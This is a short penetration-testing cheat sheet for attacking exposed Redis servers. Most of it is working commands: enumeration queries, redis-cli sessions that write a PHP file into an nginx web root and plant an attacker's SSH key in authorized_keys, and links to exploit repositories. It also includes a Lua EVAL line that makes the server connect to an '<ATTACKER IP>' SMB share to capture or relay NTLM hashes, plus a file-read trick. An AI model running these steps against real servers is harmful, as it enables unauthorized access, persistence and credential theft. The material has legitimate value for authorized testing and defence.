# Tools
redis-cli

# Commands
`INFO`
`CLIENT LIST`
`CONFIG GET *`
`SELECT 1`
`KEYS *`
`GET <KEY>`

# Create files 
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
## Or SSH
`ssh-keygen -t rsa`
`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`
`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```

# LUA Scripts
https://github.com/aodsec/CVE-2022-0543
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
https://github.com/Avinash-acid/Redis-Server-Exploit
https://github.com/n0b0dyCN/redis-rogue-server
https://lzone.de/cheat-sheet/Redis

## Get hashes or relay
Start SMB server using ntlmrelayx or smbserver and run the below to cause an SMB connection
`EVAL "dofile('\\<ATTACKER IP>\share')"`

## Enumerate files
You can also attempt to get access to files to enum locations
`EVAL "dofile('c:////inetpub///wwwroot///web.config')"`

